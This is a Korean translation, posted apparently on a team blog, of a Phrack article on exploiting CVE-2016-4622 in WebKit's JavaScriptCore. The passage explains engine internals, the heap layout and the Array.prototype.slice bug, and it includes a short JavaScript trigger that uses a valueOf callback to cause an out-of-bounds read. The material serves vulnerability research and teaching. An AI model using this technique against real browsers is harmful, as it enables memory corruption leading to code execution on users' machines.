---
title: "[번역] Attacking JavaScript Engine"
layout: post
date: 2019-04-06 15:24:00
tag:
- browser
headerImage: false
projects: false
hidden: false
category: blog
headerImage: true
author: null2root
---

# Attacking JavaScript Engines

출처 : http://www.phrack.org/papers/attacking_javascript_engines.html  
번역 및 보완 : LiLi, y0ny0ns0n, powerprove, cheese @ null2root

```
|=-----------------------------------------------------------------------=|
|=---------------=[       The Art of Exploitation       ]=---------------=|
|=-----------------------------------------------------------------------=|
|=------------------=[ Attacking JavaScript Engines ]=-------------------=|
|=--------=[ A case study of JavaScriptCore and CVE-2016-4622 ]=---------=|
|=-----------------------------------------------------------------------=|
|=----------------------------=[ saelo ]=--------------------------------=|
|=-----------------------=[ phrack@saelo.net ]=--------------------------=|
|=-----------------------------------------------------------------------=|
```



# 목차
0. [소개](#0-소개)
1. [JavaScriptCore 개요](#1-java-script-core-개요)
	1. [값, VM 그리고 (NaN-)박싱](#1-1-값-vm-그리고-na-n-박싱)
	2. [객체 및 배열](#1-2-객체-및-배열)
	3. [함수들](#1-3-함수)
2. [버그](#2-버그)
	1. [취약한 코드](#2-1-취약한-코드)
	2. [자바스크립트 변환 규칙](#2-2-자바-스크립트-변환-규칙)
	3. [valueOf로 공격하기](#2-3-value-of로-공격하기)
	4. [버그에 대한 고찰](#2-4-버그에-대한-고찰)
3. [JavaScriptCore 힙](#3-java-script-core-힙)
	1. [쓰레기 수집기(Garbage Collector) 기본 특징](#3-1-쓰레기-수집기-garbage-collector-기본-특징)
	2. [마킹된 공간(Marked space)](#3-2-마킹된-공간-marked-space)
	3. [복사된 공간(Copied space)](#3-3-복사된-공간-copied-space)
4. [익스플로잇 구축 기초단계](#4-익스플로잇-구축-기초단계)
	1. [전제 조건: Int64](#4-1-전제-조건-int-64)
	2. [addrof 와 fakeobj](#4-2-addrof-와-fakeobj)
	3. [공격 계획](#4-3-공격-계획)
5. [JSObject 시스템 이해](#5-js-object-시스템-이해)
	1. [속성 저장소](#5-1-속성-저장소-property-storage)
	2. [JSObject 내부](#5-2-js-object-내부)
	3. [구조 정보](#5-3-구조-정보)
6. [공격](#6-공격)
	1. [Structures ID 예측하기](#6-1-Structures-id-예측하기)
	2. [모든 것을 종합해 가짜 Float64Array 만들기](#6-2-모든-것을-종합해-가짜-float-64-array-만들기)
	3. [쉘코드 실행](#6-3-쉘코드-실행하기)
	4. [쓰레기 수집기에서 살아남기](#6-4-쓰레기-수집기에서-살아남기)
	5. [요약](#6-5-요약)
7. [렌더러 프로세스 악용](#7-렌더러-프로세스-악용하기)
	1. [WebKit 프로세스 및 권한 모델](#7-1-web-kit-프로세스-및-권한-모델)
	2. [동일한 원본 정책](#7-2-동일-출처-정책)
	3. [이메일 훔치기](#7-3-이메일-탈취)
8. [참조](#8-참조)

# 0. 소개

이 글은 자바스크립트 엔진 익스플로잇 취약점 중 하나를 소개하는 글이다. 그 중 웹킷 내부 엔진인 JavaScriptCore를 대상으로 한다.

설명하고자 하는 취약점은 2016년 초에 발견되어 ZDI-16-485[^1]로 보고된 CVE-2016-4622 이다. 이 취약점을 이용하면 공격자는 주소를 릭(leak)하고  웹킷 엔진에 가짜 자바 스크립트 객체를 삽입할 수 있다. 두 취약점을 조합하면 렌더러 프로세스에서 RCE(Remote Code Execution)가 가능하다. 이 취약점은 약 1년 전에 커밋된 2fa4973 에서 발생하였고 650552a 에서 패치되었다. 이 글에서는 패치되기 바로 전 버전인 커밋 320b1fc 의 코드를 사용한다. 모든 익스플로잇은 Safari 9.1.1 에서 테스트 되었다. 

익스플로잇을 설명하는 과정에서 자바스크립트 엔진 내부의 많은 부분들이 언급되므로, 익스플로잇의 이해를 위해 엔진의 구조에 관한 여러 지식이 필요하다. 우리는 JavaScriptCore 구현에 초점을 맞추지만, 여기서 사용된 개념은 일반적인 다른 엔진에도 적용된다.

이 문서를 이해하는 데에 자바스크립트 언어에 대한 사전 지식은 많이 필요하지 않다.


## 0.1 역주

아래 단어에 대해서는 다음과 같이 번역합니다.

- Object - 객체
- Property - 속성
- Element - 요소
- Address - 주소
- Garbage Collector - 가비지 컬렉터 



# 1. JavaScriptCore 개요

고급 언어인 자바 스크립트의 엔진은 일반적으로 다음의 컴포넌트를 포함한다.

  +  컴파일러 - 일반적으로 하나 이상의 JIT(Just-in-time) 컴파일러를 포함
  +  가상 머신 - 자바스크립트 실행
  +  내장된 객체 및 함수 목록을 제공하는 런타임

컴파일러의 내부 동작은 이 문서에서 설명하는 버그와는 거리가 멀기 때문에 크게 신경쓰지 않을 것이다. 주어진 소스 코드를 바이트코드(그리고 JIT 컴파일러의 경우 native 코드)로 변환하는 블랙박스 정도로 이해하면 충분하다.


## 1.1 값, VM 그리고 (NaN-)박싱


일반적으로 가상 머신(VM)에는 생성된 바이트 코드를 직접 실행할 수 있는 인터프리터가 포함되어 있다. 레지스터 기반 머신과 대조적으로 VM은 스택 기반 시스템으로 구현되므로, 명령에 사용되는 오퍼랜드(값)들은 스택으로부터 읽히고 쓰여진다. 특정 opcode 핸들러의 구현을 다음과 같이 표현해 볼 수 있다.


```C++
CASE(JSOP_ADD)
    {
        MutableHandleValue lval = REGS.stackHandleAt(-2);
        MutableHandleValue rval = REGS.stackHandleAt(-1);
        MutableHandleValue res = REGS.stackHandleAt(-2);
        if (!AddOperation(cx, lval, rval, res))
            goto error;
        REGS.sp--;
    }
END_CASE(JSOP_ADD)
```

위 예는 실제로 파이어폭스의 Spidermonkey 엔진(Webkit 의 JavaScriptCore 와 대응)에서 가져온 코드의 일부이다. JavaScriptCore(JSC) 는 어셈블리 언어의 형태로 작성된 인터프리터를 사용하기 때문에 위의 예처럼 간단하지 않지만, 관심있는 분은 LowLevelInterpreter64.asm 에서 JSC의 저수준 인터프리터(Low Level Interpreter, LLint)의 구현을 볼 수 있다.

보통 첫 번째 단계의 JIT 컴파일러( baseline JIT라고도 함)는 인터프리터의 디스패치 오버헤드(dispatching overhead)를 제거하는 작업을 처리하는 반면, 상위 단계의 JIT 컴파일러는 우리에게 익숙한 AOT(Ahead-Of-Time) 컴파일러와 유사하게 정교한 최적화를 수행한다. JIT 컴파일러는 일반적으로 추측에 근거하여 최적화를 한다. 예를 들어 '이 변수는 항상 숫자를 포함할 것이다'와 같은 일부 가정에 기초하여 최적화를 수행하는 것이다. 만약 잘못된 가정으로 인해 최적화가 잘못 된 경우, 해당 코드를 폐기하고 한 단계 아래의 JIT 컴파일 코드로 되돌린다. 다른 실행 모드에 대한 자세한 내용은 [^2] 및 [^3]을 참조하라.

자바스크립트는 동적인 타입을 지원하는 언어다. 따라서 타입 정보는 변수(compile-time)가 아닌 값(runtime)과 연관된다. 자바스크립트가 내장하고 있는 타입의 종류[^4]에는 primitive 타입(number, sring, boolean, null, undefined, symbol)과 object(array, function, ... )가 있다. 또 다른 주목할 만한 점은, 자바스크립트 언어에는 다른 언어에서 존재하는 클래스의 개념이 없으므로 상속을 사용할 수 없다는 것이다. 대신 자바스크립트에서는 "프로토타입 기반 상속 prototype-based-inheritance"을 구현한다. 여기서 각 object 는 property 가 통합된 프로토타입 object 에 대한 (아마 null일) 참조를 갖는다. 자세한 내용은 자바스크립트 사양 [^5]을 참조하라.

모든 주요 자바스크립트 엔진은 성능상의 이유로 8바이트 이하의 값들만 사용할 수 있다(빠른 복사, 64bit 아키텍처의 레지스터에 적합). Google의 v8과 같은 일부 엔진은 값을 표현하기 위해 태그된 포인터(tagged pointer)들을 사용한다. 여기서 LSB(Least Significant Bit)는 값이 포인터인지 또는 어떤 형태의 상수인지를 나타낸다. 반면에 JavaScriptCore(JSC)와 Firefox 의 Spidermonkey는 NaN-boxing이라는 개념을 사용한다. 자바스크립트에서는 NaN 을 표현하기 위해 여러 가지의 비트 패턴을 사용하는데, NaN-boxing은 NaN 패턴을 제외한 부분에 원하는 값을 인코딩 할 수 있다는 사실을 이용한다. 특히 IEEE 754 부동소수점에서 모든 exponent 비트가 1이더라도 fraction bit 가 0이 아닌 경우 이 값은 NaN 을 나타낸다.  

자료형이 double 인 경우[^6], NaN-boxing 은 값의 표현을 위해 하위 51 비트를 사용한다. 현재의 64bit 플랫폼에서도 주소 지정을 위해 48bit만을 사용하기 때문에, 51 비트의 공간은 포인터 및 32bit 정수를 저장(*Encoding*)하기에 충분하다.

JSC가 사용하는 스키마는 JSCJSValue.h에 잘 설명되어 있으므로 읽어보길 권한다. 이와 관련한 부분이 추후 중요하게 사용되므로 아래에 인용한다:

> 상위 16비트는 인코딩된 JSValue 의 유형을 나타낸다: 
> 
```
> Pointer {  0000:PPPP:PPPP:PPPP  
>        / 0001:****:****:****  
> Double  {         ...  
>        \ FFFE:****:****:****  
> Integer {  FFFF:0000:IIII:IIII  
```
>     
> double-precision 값을 JSValue 로 인코딩하려면 double 값에 2^48 을 더해서 64비트 형태로 표현하면 된다.
> 이 조작 후에 인코딩된 double-precision 값은 0x0000 또는 0xFFFF 패턴으로 시작할 수 없다. 상위 16 비트가 0x0001 - 0xFFFE 의 범위를 갖는 것이다.
> 이렇게 만들어진 JSValue 값들로 추가적인 연산을 하고자 한다면, 먼저 위 인코딩을 역으로 수행하여 JSValue 값을 double 값으로 디코딩해야 한다.
>
> 부호있는 32비트 정수는 16비트 태그인 0xFFFF로 표시된다.
>
> 0x0000 태그는 포인터 또는 바로 태그된 상수의 다른 형태를 나타낸다. 
> boolean, null 및 undefined 값은 유효하지 않은 특정 포인터 값으로 표시된다.
```
> False:     0x06
> True:      0x07
> Undefined: 0x0a
> Null:      0x02          -> 0000:0000:0000:0002
```

흥미로운 점은, 0x0 은 유효한 JSValue가 아니므로 엔진 내부에서 문제를 일으킬 수 있다는 점이다.

## 1.2 객체*object* 및 배열*array*

 기본적으로 자바스크립트의 객체는 (키*key*, 값*value*) 쌍으로 저장되는 속성*property*들의 모음이다. 속성은 점 연산자(foo.bar) 또는 대괄호(foo['bar'])를 통해 접근할 수 있다. 이론적으로 키*key*를 사용해서 값*value*을 검색할 때, 키는 문자열로 먼저 변환되어 사용된다. 

 이와는 달리 배열은 문자열이 아닌 32bit 숫자 인덱스로 내부 속성들*properties*에 접근 가능한 특이 객체*exotic object*이다. 이렇게 배열에서 숫자로 접근할 수 있는 속성들을 요소*Elements* 라고 부른다. [^7] 최근에는 이러한 개념이 모든 객체에 적용되어, 대부분의 엔진에서 모든 객체는 속성*properties*과 요소*elements* 두 가지 모두를 가지게 되었다. 속성은 문자열 혹은 심볼 키를 통해 접근할 수 있고 요소는 정수 인덱스를 통해 접근할 수 있다. 배열은 ‘length’ 속성을 가지는 객체로 취급하며, length 는 최상위 element 의 인덱스 값을 가진다. 

내부적으로 JSC는 동일한 메모리 영역에 속성과 요소를 모두 저장하고, 객체 자체는 해당 메모리 영역에 대한 포인터를 저장한다. 이 포인터는 영역의 한 가운데를 가리키고 있으며, 속성은 영역의 왼쪽(낮은 주소), 요소는 오른쪽에 저장된다. 또한 포인터가 가리킨 영역 바로 앞에 'length' 속성(요소 벡터의 길이를 포함하는 작은 헤더)이 있다. 이 개념은 나비의 날개처럼 왼쪽과 오른쪽으로 값이 확장되기 때문에 "Butterfly"라고 불린다. 앞으로 포인터 및 메모리 영역을 "Butterfly"로 지칭할 것이다.


```
--------------------------------------------------------
.. | propY | propX | length | elem0 | elem1 | elem2 | ..
--------------------------------------------------------
                            ^
                            |
            +---------------+
            |
  +-------------+
  | Some Object |
  +-------------+
```


당연한 말이지만, 요소들은 메모리에 일렬로 쭉 나열되지는 않는다. 

예를 들어

```javascript
a = [];
a[0] = 42;
a[10000] = 42;
```

이 코드는 일종의 희소 배열 형태로 저장될 가능성이 높다(전체를 할당하지 않고, 주어진 index 및 데이터를 따로 매핑하는 절차를 수행). 이렇게 하면 이 배열은 10001개의 값 슬롯을 필요로 하지 않는다.

한편, 배열은 데이터를 저장할 때 JSValue 가 아닌 다른 표현을 사용하기도 한다. 예를 들어, 32비트 정수 배열은 NaN-Boxing의 인코딩/디코딩 과정에 들어가는 리소스와 메모리를 줄이기 위해 값을 네이티브 형태로 저장하기도 한다. JSC는 IndexingType.h에서 여러 가지 인덱스 유형을 정의하고 있다. 가장 중요한 것은 다음과 같다.

```C++
ArrayWithInt32      = IsArray | Int32Shape;
ArrayWithDouble     = IsArray | DoubleShape;
ArrayWithContiguous = IsArray | ContiguousShape;
```

여기서 마지막 타입인 ArrayWithContiguous 는 JSValue 를 저장하고, 이전 두 타입은 네이티브 타입을 저장한다.
이 시점에서 독자는 아마 이 모델에서 속성*property* 값을 어떻게 조회하는지 궁금해 할 것이다. 나중에 이것에 대해 광범위하게 알아보겠지만, 짧게 설명하자면 JSC의 모든 객체에는 "structure"라고 불리는 특별한 메타 객체*meta-object*가 속성 이름과 슬롯 번호간의 매핑을 제공하고 있어서, 속성 검색에 이를 이용한다는 것이다.


## 1.3 함수

함수는 자바스크립트 언어에서 매우 중요하기 때문에 깊이 이해해야 한다.

함수를 호출할 때 두 개의 특별한 파라미터를 사용할 수 있다. 그 중 하나인 `arguments`는 함수의 인자값(및 caller)에 대한 접근을 가능하게 하여, 가변 인자를 갖는 함수를 만들 수 있게 한다. 또 다른 하나인 `this` 는 아래에서 설명하는 것과 같이 같이 어떤 함수에서 호출되었느냐에 따라 다른 객체를 가리키게 된다.

- 함수가 생성자에 의해 호출된 경우('new func()'를 사용해) 'this'는 새롭게 만들어진 객체를 가리킨다. 생성된 객체의 prototype 은 함수 객체의 .prototype 속성(함수가 정의될 때 세팅됨)을 상속받는다.
- 함수가 일부 객체의 method로 호출되었다면('obj.func()'를 사용해), 'this'는 참조 객체를 가리킬 것이다.
- 그 밖의 'this'는 단순히 현재의 전역 객체를 가리킨다. 함수 바깥에서도 마찬가지다.

함수 또한 자바스크립트의 객체로 취급되기 때문에 속성을 가질 수 있다. 우리는 이미 위에서 .prototype 속성이 있다는 것을 보았다. 각각의 함수(실제론 함수 프로토타입의)가 갖는 흥미로운 속성 두 가지는 .call 함수와 .apply 함수로, 주어진 'this' 객체와 인자값으로 함수를 호출할 수 있다. 예를 들어 데코레이터 기능을 구현하기 위해 아래와 같은 코드를 작성할 수 있다.

```C++
 function decorate(func) {
        return function() {
            for (var i = 0; i < arguments.length; i++) {
                // do something with arguments[i]
            }
            return func.apply(this, arguments);
        };
    }
```

 이런 함수 구현이 가능하다는 것은 자바스크립트 엔진에게도 함축적인 의미가 있다. 스크립트에서 값을 임의로 세팅할 수 있기 때문에, 엔진은 참조된 객체의 값에 대해 어떠한 가정도 할 수 없게 된다. 따라서 모든 내부 Javacript 함수는 이들의 인자값뿐 아니라 이 객체의 타입도 확인해야 한다.

내부적으로 built-in 함수와 메소드 [^8]는 보통 C++에서 native 함수로 구현되거나 자바스크립트 자체에서 구현된다. native 함수의 간단한 예로 JSC의 Math.pow() 함수 구현을 살펴보자.

```C++
EncodedJSValue JSC_HOST_CALL mathProtoFuncPow(ExecState* exec)
{
        // ECMA 15.8.2.1.13

        double arg = exec->argument(0).toNumber(exec);
        double arg2 = exec->argument(1).toNumber(exec);

        return JSValue::encode(JSValue(operationMathPow(arg, arg2)));
}
```

위 코드를 통해 다음을 확인할 수 있다.

1. 자바스크립트 native 함수의 시그니쳐
2. `argument` 메소드를 사용하여 인자값을 얻는 방법(인자가 충분하지 않은 경우 undefined 값을 반환함)
3. 인자값들을 필요한 타입으로 변환하는 방법. 배열을 숫자로 변환하기 위해 toNumber 를 사용하는 것처럼 변환을 관리하는 규칙 리스트가 있다. 이것들은 나중에 더 알아볼 것이다.
4. native 데이터 타입으로 실제 작업을 수행하는 방법
5. caller 에게 결과를 반환하는 방법. 리턴값이 native 타입의 숫자인 경우 값으로 인코딩해서 리턴한다.

여기에 보이는 또 다른 패턴이 있다: 다양한 작업의 핵심 구현(이 경우 operationMathPow)을 별도의 함수로 이동시켜 JIT 컴파일 코드에서 직접 호출할 수 있다.

# 2. 버그

문제가 되는 버그는 Array.prototype.slice에 존재한다[^9]. 자바스크립트에서 slice 메소드가 호출되면 엔진 내부에서 native 함수 arrayProtoFuncSlice(ArrayPrototype.cpp 에 위치함)가 호출된다.

```javascript
    var a = [1, 2, 3, 4];
    var s = a.slice(1, 3); // 이제 s는 [2, 3]을 포함한다
```

다음 절에서 설명할 코드를 통해 함수 흐름을 확인할 수 있다. 가독성을 위해 일부 코드는 생략을 거쳤으며 주석을 통해 설명을 달아 두었다. 전체적인 구현은 온라인에서 확인할 수 있다 [^10].

## 2.1 취약한 코드

```C++
EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)
{
      /* [[ 1 ]] */
      JSObject* thisObj = exec->thisValue()
                         .toThis(exec, StrictMode)
                         .toObject(exec);
      if (!thisObj)
        return JSValue::encode(JSValue());

      /* [[ 2 ]] */
      unsigned length = getLength(exec, thisObj);
      if (exec->hadException())
        return JSValue::encode(jsUndefined());

      /* [[ 3 ]] */
      unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length);
      unsigned end =    argumentClampedIndexFromStartOrEnd(exec, 1, length, length);

      /* [[ 4 ]] */
      std::pair<SpeciesConstructResult, JSObject*> speciesResult = speciesConstructArray(exec, thisObj, end - begin);
      // 사용자 함수를 호출해야만 예외를 얻을 수 있다.
      if (UNLIKELY(speciesResult.first == SpeciesConstructResult::Exception))
        return JSValue::encode(jsUndefined());

      /* [[ 5 ]] */
      if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &&
            isJSArray(thisObj))) {
        if (JSArray* result = asArray(thisObj)->fastSlice(*exec, begin, end - begin))
          return JSValue::encode(result);
      }

      JSObject* result;
      if (speciesResult.first == SpeciesConstructResult::CreatedObject)
        result = speciesResult.second;
      else
        result = constructEmptyArray(exec, nullptr, end - begin);

      unsigned n = 0;
      for (unsigned k = begin; k < end; k++, n++) {
        JSValue v = getProperty(exec, thisObj, k);
        if (exec->hadException())
          return JSValue::encode(jsUndefined());
        if (v)
          result->putDirectIndex(exec, n, v);
      }
      setLength(exec, result, n);
      return JSValue::encode(result);
}
```

이 코드에 대해 설명하면

1. 메소드 호출에 대한 참조 객체`reference object` 가져오기 (여기서는 배열 객체)
2. 배열의 길이 확인
3. 인자(시작과 끝의 인덱스)를 기본 정수형으로 변환하고 [0,길이)로 범위를 고정
4. Species 생성자[^11]을 사용해야 되는지 확인
5. 슬라이싱을 수행

슬라이싱을 하는 단계는 두가지 방법 중 하나로 수행된다. 만약 배열이 데이터가 빽빽하게 들어 있는 기본 배열`native array`일 경우 `fastSlice`에서 `memcpy`를 이용해 주어진 인덱스와 길이로 새로운 배열에 값만 넣는다.  만약 이와 같은 `fast path`가 불가능하다면 간단한 반복문을 사용하여 각 요소를 가져와 새 배열에 추가한다. 참고로, `slow path`에 사용되는 속성 접근자와 달리 `fastSlice`는 추가적인 경계`bounds`검사를 하지 않는다.

코드를 보면, 변수 `begin`과 `end`가 기본 정수형으로 변환된 후 배열 크기보다 작아졌다고 쉽게 가정 할 수 있다. 하지만 우리는 자바스크립트의 형 변환 규칙을 이용하여 이러한 가정을 깨뜨릴 수 있다.

##  2.2 자바 스크립트 변환 규칙

자바스크립트는 태생적으로 weakly typed을 지원하는데, 이는 다양한 타입의 값을 현재 필요한 타입으로 변환할 거라는 것을 의미한다. 인자의 절대값을 반환하는 Math.abs()를 고려해보면, 아래의 모든 함수 호출은 "유효(valid)"하므로 예외가 발생하지 않는다.

```javascript
    Math.abs(-42);      // 인자값이 숫자다
    // 42
    Math.abs("-42");    // 인자값이 문자열이다
    // 42
    Math.abs([]);       // 인자값이 빈 배열이다
    // 0
    Math.abs(true);     // 인자값이 boolean 형이다
    // 1
    Math.abs({});       // 인자값이 객체다
    // NaN
```


반면, python 등의 강한 타입(strongly-typed)을 지원하는 언어에서는  abs()의 인자값으로 문자열을 주었을 경우 예외를 발생시킨다. 만약 정적인 타입을 지원하는 언어라면 컴파일 시에 오류를 발생시킨다.

숫자 타입의 변환 규칙은 [^12]에서 확인할 수 있다. 객체를 숫자(primitive types)로 변환하는 규칙이 흥미로운데, 객체에 "valueOf"라는 호출 가능한 속성`property`이 있는 경우 이 메소드를 호출하여 결과가 원시 값(primitive value)인 경우 이 값을 그대로 사용한다.

그러므로 

```javascript
    Math.abs({valueOf: function() { return -42; }});
    // 42
```

위와 같은 결과가 나온다.

## 2.3  valueOf로 공격하기

'arrayProtoFuncSlice' 함수 호출 시 범위 지정을 위해 전달된 파라미터(숫자 객체)는 `argumentClampedIndexFromStartOrEnd` 함수 내에서 primitive 타입 으로 변환된다. 또한 이 함수 안에서 인자값의 범위가 `[0, length)`로 고정된다.

```C++
    JSValue value = exec->argument(argument);
    if (value.isUndefined())
        return undefinedValue;

    double indexDouble = value.toInteger(exec);  // 타입 변환이 발생하는 부분
    if (indexDouble < 0) {
        indexDouble += length;
        return indexDouble < 0 ? 0 : static_cast<unsigned>(indexDouble);
    }
    return indexDouble > length ? length :
                                  static_cast<unsigned>(indexDouble);
```

만약 slice 를 호출할 때 valueOf 함수를 통해 배열의 length 속성을 바꾼다면, slice 의 내부에서는 바꾸기 전의 length 값을 계속 사용할 것이고, 이는 memcpy가 실행되는 시점에 Out-Of-Bounds Access(이하 OOB Access)로 이어질 것이다.

일단 실제로 OOB Access를 시도해보기 전에, 배열을 축소하면 element storage 의 크기가 실제로 조정되는지 확인해야 한다. 이를 위해 JSArray::setLength에 있는 .length setter의 코드를 간단히 살펴보자

```C++
    unsigned lengthToClear = butterfly->publicLength() - newLength;
    unsigned costToAllocateNewButterfly = 64; // 휴리스틱
    if (lengthToClear > newLength &&
        lengthToClear > costToAllocateNewButterfly) {
        reallocateAndShrinkButterfly(exec->vm(), newLength);
        return true;
    }
```

이 코드에서는 배열을 너무 자주 재배치하지 않도록 간단한 휴리스틱을 구현해 두었다. 공격을 위해 배열을 강제로 재배치해야 한다는 고려하면, 휴리스틱 우회를 위해서 새로운 length 값을 이전보다 훨씬 작게 만들어야 할 것이다. 예를 들어 100개의 요소에서 0개로 크기를 조정해야 재배치가 발생할 것이다.

이를 통해, Array.prototype.slice를 공격할 수 있는 방법은 다음과 같다.

```javascript
    var a = [];
    for (var i = 0; i < 100; i++)
        a.push(i + 0.123);

    var b = a.slice(0, {valueOf: function() { a.length = 0; return 10; }});
    // b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]
```

slice 작업 전에 배열을 지웠기 때문에 예상되는 출력값은 `undefined` 값들로 채워진 길이가 10인 배열이지만, 실제로 출력해 보면 부동 소수점 값들이 나타나는 것을 확인할 수 있다. 아무래도 배열 범위의 끝을 넘어 값들을 읽어들인 것처럼 보인다. :)

## 2.4 - 버그에 대한 고찰

이러한 프로그래밍 실수는 꾸준히 있었던 것이고 지속적으로 공격받아 왔다 [^13] [^14] [^15]. 여기서 핵심 문제는 스택 프레임(이 경우 배열 객체의 길이)이  변경 가능한 `cached` 상태라는 것이다. 이는 다양한 콜백 메커니즘(위 경우 "valueOf" 메소드)을 결합하여 사용자가 제공한 코드를 기존 call stack 보다 더 아래에서 실행할 수 있게끔 해 준다. 이런 방식을 이용하면 함수 전반에 걸쳐 엔진 상태에 대해 잘못된 가정을 하도록 만드는 것이 매우 간단해진다. 다양한 이벤트 콜백으로 인해 DOM에서도 이와 동일한 문제가 나타난다.

# 3. JavaScriptCore 힙

우리는 배열을 통해 데이터를 읽었지만 현 시점에서 우리가 무엇에 접근하는 것인지 정확히 알지 못한다. 이를 이해하려면 JSC 힙 할당자에 대한 배경 지식이 필요하다.

## 3.1 가비지 컬렉터(Garbage collector) 기본 특징

자바스크립트는 가비지 컬렉션(Garbage Collection)기능을 가진 언어로, 이는 프로그래머가 메모리 관리에 신경 쓸 필요가 없다는 것을 의미한다. 다만 가비지 컬렉터는 가끔 정리하면 안되는 객체들 또한 정리해 버리기도 한다.

가비지 컬렉터의 동작 방식 중 많이 사용되는 방법은 참조 카운트를 활용하는 것이다. 현재 대부분의 자바스크립트 엔진은 mark-and-sweep 알고리즘을 사용한다. 여기서 컬렉터는 정기적으로 루트 노드 집합부터 존재하는 모든 객체를 스캔하여 모든 죽은 객체를 해제(free) 한다. 루트 노드는 대개 웹 브라우저 context 에서 `window` 객체와 같은 전역 객체뿐만 아니라 스택에 위치한 포인터이다.

가비지 컬렉션 시스템 사이에는 다양한 차이점이 있다. 이제 우리는 독자들이 관련된 코드의 일부를 이해하는 데 도움이 되는 가비지 컬렉션 시스템의 몇 가지 주요 특징에 대해 알아볼 것이다. 이미 알고 있는 사람은 이 섹션을 자유롭게 건너뛰어도 된다.

우선 JSC는 "신중한 가비지 컬렉션"(conservative garbage collector) 를 사용한다[^16]. 이는 가비지 컬렉터가 루트 노드를 추적하지 않는다는 것을 의미한다. 대신 GC 동안 스택 안에 힙을 가리키는 포인터가 될 수 있는 값을 찾고 이를 루트 노드로 처리한다. 이와는 다른 타입의 garbage collector 로 "정확한 가비지 컬렉터"(precise garbage collector) 가 있다. 스택에 존재하는 모든 힙 오브젝트에 대한 참조를 포인터 클래스(Rooted<>) 에 등록하고 관리한다. Spidermonkey 가 이런 타입의 컬렉터를 사용하고 있다.

다음으로, JSC는 "증가하는 가비지 컬렉터"(incremental garbage collector)를 사용한다. 이 타입은 응용프로그램이 실행되는 중간중간에 marking를 수행하는 방식으로 동작하여 가비지 컬렉터의 시간 지연을 줄인다. 그러나 이런 타입은 올바르게 작동하게 하려면 추가적인 노력을 필요로 한다. 다음과 같은 경우를 살펴보자

- 가비지 컬렉터가 실행되면 임의의 객체 O 및 O 가 참조한 모든 객체를 방문한 뒤, 그것들을 방문했다고 마킹을 한 후 스스로 일시 중지해 응용프로그램이 다시 실행될 수 있도록 한다.
- O 가 수정되어 다른 객체 P 에 대한 새로운 참조가 추가된다.
- 그 뒤에 가비지 컬렉터는 다시 작동하지만 P에 대해서는 알지 못하며, 마킹 단계를 마치고 P의 메모리를 해제(free)한다.

위와 같은 상황이 발생할 경우 가비지 컬렉터에게 알려 주기 위해 엔진에서는 이른바 라이트 배리어(write barriers)가 삽입된다. 이러한 베리어는 JSC에서 WriteBarrier<> 및 CopyBarrier<> 클래스로 구현된다.

마지막으로 JSC는 움직이는 가비지 컬렉터와 움직이지 않는 가비지 컬렉터(moving and a non-moving garbage collector)를 모두 사용한다. 움직이는 가비지 컬렉터는 살아 있는 객체를 다른 위치로 이동시키고 해당 객체의 모든 포인터를 업데이트한다. 이렇게 하면 비활성 객체(dead objects)를 일일이 해제 목록(free list) 에 추가하는 대신 전체 메모리 영역을 해제(free)할 수 있어서 런타임 오버헤드가 없다는 장점이 있다. JSC 에서는 이렇게 움직이는 영역`moving heap`에 Butterfly 및 다른 배열들을 저장하고, 반면 움직이지 않는 힙 영역`non-moving heap`에는 자바스크립트 객체 자체와 함께 기타 몇몇 객체들을 저장한다. 움직이는 힙 영역과 움직이지 않는 영역은 각각 `the copied space`, `the marked space` 라는 이름으로도 불린다.


## 3.2 마킹된 공간(Marked space)

마킹된 공간은 Cell 이라는 이름의 메모리 블록들로 구성된다. JSC에서 이 공간에 할당된 모든 객체는 JSCell 클래스를 상속받는다. 이 Cell 의 헤더(첫 8바이트)는 현재 Cell 의 상태를 나타내는데, 가비지 컬렉터는 이 헤더를 보고 해당 Cell 을 방문했는지의 여부를 판단한다.

마킹된 공간에 대해 언급할 가치가 있는 또 다른 것이 있는데, JSC는 각각의 마킹된 블록 시작 부분에 MarkedBlock 인스턴스를 보관한다

```C++
    inline MarkedBlock* MarkedBlock::blockFor(const void* p)
    {
        return reinterpret_cast<MarkedBlock*>(
                    reinterpret_cast<Bits>(p) & blockMask);
    }
```

MarkBlock 인스턴스 내에는 자기 자신의 Heap 과 VM 인스턴스를 가리키는 포인터가 있어서, 만약 엔진이 현재 Context 에 접근할 수 없는 경우에도 데이터에 접근 가능하게 해 준다. 이는 공격에 사용할 가짜(fake) 객체를 만드는데 걸림돌이 되는데, 몇몇 작업에서 유효한 MarkedBlock 인스턴스가 요구될 수 있기 때문이다. 따라서 가능하다면 유효한(Vaild) 마킹된 블록 안에 가짜 객체를 만드는 것이 바람직하다.

## 3.3 복사된 공간(Copied space)

마킹된 공간의 몇몇 객체들은 자신이 사용하고자 하는 버퍼를 복사된 공간으로부터 할당받기도 한다. 대부분 Butterfly 를 저장하기 위해 사용하지만, `TypedArray` 도 여기에 위치할 수 있다. 앞서 확인한 Out-Of-Bounds Access는 이 메모리 지역에서 발생한다.

복사된 공간의 할당자는 매우 간단하다.

```C++
    CheckedBoolean CopiedAllocator::tryAllocate(size_t bytes, void** out)
    {
      ASSERT(is8ByteAligned(reinterpret_cast<void*>(bytes)));

      size_t currentRemaining = m_currentRemaining;
      if (bytes > currentRemaining)
        return false;
      currentRemaining -= bytes;
      m_currentRemaining = currentRemaining;
      *out = m_currentPayloadEnd - currentRemaining - bytes;

      ASSERT(is8ByteAligned(*out));

      return true;
    }
```

이 할당자에는 충돌 가능성(bump allocator)이 있다. 현재의 메모리 블록이 모두 사용될 때까지 계속해서 다음 N바이트 메모리를 반환하도록 구현되어 있다. 따라서 만약 2번의 할당이 연속적으로 이루어지는 경우, 두 영역은 높은 확률로 메모리 상에서 인접하게 배치될 것이다(예외가 있다면 1번째 할당이 현재 블록을 모두 채우는 것이다).

우리는 이런 특징을 공격에 활용할 수 있다. 만약 우리가 각각 한 개의 요소를 가진 두 개의 배열을 할당한다면, 거의 모든 경우에 두 Butterfly들은 서로 붙어 있게 될 것이다.

# 4. 익스플로잇 구축 기초단계

버그는 단순한 Out-Of-Bounds Read 처럼 보이지만, 우리가 원하는 JSValue 들을 새로 만든 자바스크립트 배열에 "삽입"할 수 있고, 이는 곧 엔진에 그 값을 주입할 수 있다는 것이기 때문에 강력한 기초단계인 것이다.

우리는 이 버그를 이용하여 익스플로잇을 위한 2개의 기초단계들을 구축할 것이다.

